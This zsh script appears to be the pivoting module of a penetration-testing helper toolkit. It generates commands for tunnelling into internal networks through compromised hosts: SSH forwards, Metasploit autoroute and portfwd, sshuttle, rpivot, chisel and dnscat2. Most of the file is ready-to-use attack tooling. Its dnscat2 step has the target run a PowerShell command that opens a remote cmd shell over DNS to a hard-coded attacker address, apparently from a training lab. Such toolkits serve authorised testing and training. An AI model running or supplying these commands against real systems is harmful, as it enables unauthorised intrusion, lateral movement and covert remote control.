#!/usr/bin/env zsh

############################################################# 
# nb-pivot
#############################################################
nb-pivot-help() {
    cat << "DOC" | bat --plain --language=help

nb-pivot
------------
The pivot namespace provides commands for using proxies for pivoting.

Using Metasploit
----------------
nb-pivot-msf-local-proxy              forwards local port to remote port using msf's local socks4 proxy
nb-pivot-msf-remote-proxy             forwards local port to remote port
nb-pivot-msf-reverse-proxy            forwards remote port to local port

Using Automated Tools
------------
nb-pivot-sshuttle                     ssh pivoting with sshuttle (without the need of proxychains)
nb-pivot-rpivot-server                web server pivoting with rpivot server.py
nb-pivot-rpivot-client                web server pivoting with rpivot client.py

Using SSH
---------
nb-pivot-ssh-dynamic-proxy            forwards local port to remote port using ssh's dynamic socks4 proxy
nb-pivot-ssh-reverse-proxy            forwards remote port to local port

Branching Out Tunnels
---------------------
nb-pivot-dnscat2-server               create a encrypted channel session over dns protocol in txt records
nb-pivot-dnscat2-client               command to establish a tunnel with to the running server on the attack host
nb-pivot-chisel-server                socks5 tcp/udp tunneling via http protocol using ssh with chisel server
nb-pivot-chisel-client                socks5 tcp/udp tunneling via http protocol using ssh with chisel client
nb-pivot-icmp-server
nb-pivot-icmp-client

Commands
--------
nb-pivot-mount-remote-sshfs           mounts a remote directory to local /mnt path using sshfs
nb-pivot-install                      installs dependencies

DOC
}

nb-pivot-install() {
    __info "Running $0..."
    __pkgs sshfs rsync proxychains sshuttle python2.7 go
}

nb-pivot-mount-remote-sshfs() { 
    nb-vars-set-user
    local lm && __askpath lm LMOUNT /mnt
    local rm && __askvar rm RMOUNT /
    nb-vars-set-rhost
    mkdir -p ${lm}
    print -z "sshfs ${__USER}@${__RHOST}:${rm} ${lm}" 
}

nb-pivot-ssh-dynamic-proxy() {
    nb-vars-set-user
    nb-vars-set-rhost
    nb-vars-set-lport
    __info "Add the proxy to proxychains4.conf using command:"
    __ok "echo 'socks4 	127.0.0.1 ${__LPORT}' | sudo tee -a /etc/proxychains4.conf"

    print -z "ssh -D ${__LPORT} -CqN ${__USER}@${__RHOST}" 
}

nb-pivot-ssh-reverse-proxy() {
    nb-vars-set-user
    nb-vars-set-rhost
    nb-vars-set-rport
    nb-vars-set-lport
    print -z "ssh -R ${__LPORT}:127.0.0.1:${__RPORT} ${__USER}@${__RHOST}" 
}

nb-pivot-msf-local-proxy() {
    nb-vars-set-lport
    local sb && __askvar sb NETWORK_SUBNET
    __info "Add the proxy to proxychains4.conf using command:"
    __ok "echo 'socks4 	127.0.0.1 ${__LPORT}' | sudo tee -a /etc/proxychains4.conf"

    print -z "msfconsole -q -n -x 'use auxiliary/server/socket_proxy; set SRVPORT ${__LPORT}; set SRVHOST 0.0.0.0; set version 4a; run'"

    echo
    __info "Then use post/multi/manage/autoroute to tell our socks_proxy module to route all the traffic via the meterpreter session"
    __ok "use post/multi/manage/autoroute; set SESSION 1; set SUBNET $sb; run"
    echo
    __info "You can also add routes with autoroute in metepreter session: 'run autoroute -s $sb'"
    __info "Use 'run autoroute -p' to list the active routes"
    __info "You can now use proxychains with e.g. nmap"
}

nb-pivot-msf-remote-proxy() {
    nb-vars-set-rhost
    nb-vars-set-rport
    nb-vars-set-lport

    __info "Use this command in meterpreter shell:"
    __ok "portfwd add -l ${__LPORT} -p ${__RPORT} -r ${__RHOST}"
}

nb-pivot-msf-reverse-proxy() {
    nb-vars-set-rhost
    nb-vars-set-rport
    nb-vars-set-lport

    __info "Use this command in meterpreter shell:"
    __ok "portfwd add -R -l ${__LPORT} -p ${__RPORT} -L ${__RHOST}"
}

nb-pivot-sshuttle() {
    nb-vars-set-user
    nb-vars-set-rhost
    local sb && __askvar sb NETWORK_SUBNET

    print -z "sudo sshuttle -r ${__USER}@${__RHOST} $sb -v"
}

nb-pivot-rpivot-server() {
    nb-vars-set-lport
    print -z "python2.7 server.py --proxy-port ${__LPORT} --server-port 9999 --server-ip 0.0.0.0"
}

nb-pivot-rpivot-client() {
    nb-vars-set-lhost

    __ask "Did you transfer the 'rpivot' to the target? (y/n)"
    local rp && __askvar rp "ANSWER"

    if [[ $rp == "n" ]]; then
      __err "Transfer 'rpivot' to target before proceeding."
      __info "Use nb-srv-scp-up (use scp -r)"
      exit 1
    fi

    __info "Run client.py from pivot target:"
    __ok "cd rpivot"
    __ok "python2.7 client.py --server-ip ${__LHOST} --server-port 9999"
    echo
    __info "Add the proxy to proxychains4.conf using command:"
    __ok "echo 'socks4 	127.0.0.1 ${__LPORT}' | sudo tee -a /etc/proxychains4.conf"
    echo
    __info "Use proxychains to access teh web server: 'proxychains firefox <target_ip>:80'"
}

nb-pivot-dnscat2-server() {
    nb-vars-set-lhost
    nb-vars-set-domain
    print -z "sudo ruby dnscat2.rb --dns host=${__LHOST},port=53,domain=${__DOMAIN} --no-cache"
    __info "Copy the secret key, will be needed for dnscat2 client on Windows host for tunnel encryption"
}

nb-pivot-dnscat2-client() {
    nb-vars-set-lhost

    __ask "Did you transfer the 'dnscat2.ps1' to the target? (y/n)"
    local dn && __askvar dn "ANSWER"

    if [[ $dn == "n" ]]; then
      __err "Transfer 'dnscat2.ps1' to target before proceeding."
      __info 'nb-srv-scp-up'
      exit 1
    fi

    __ask "Enter the secret key generated from dnscat-server command"
    local key && __askvar key "SECRET_KEY"

    __info "Run the following commands on the target (powershell):"
    __ok "Import-Module .\\dnscat2.ps1"
    __ok "Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret $key -Exec cmd"
    echo
    __info "You can drop into a shell using 'window -i 1'"
}

nb-pivot-chisel-server() {
    nb-vars-set-lport

    __ask "Did you transfer the 'chisel' to the target? (y/n)"
    local tr && __askvar tr "ANSWER"

    if [[ $tr == "n" ]]; then
      __err "Transfer 'chisel' to target before proceeding."
      __info 'nb-srv-scp-up'
      exit 1
    fi

    __info "Run the following commands on the target  to spawn a server:"
    __ok "./chisel server -v -p ${__LPORT} --socks5"
}

nb-pivot-chisel-client() {
    nb-vars-set-rhost
    __ask "Use the same port you used with chisel server"
    nb-vars-set-lport

    __info "Add the proxy on port 1080 to proxychains4.conf using command:"
    __ok "echo 'socks5 	127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf"
    __info "You can now use proxychains with e.g. nmap"

    print -z "chisel client -v ${__RHOST}:${__LPORT} socks"
}
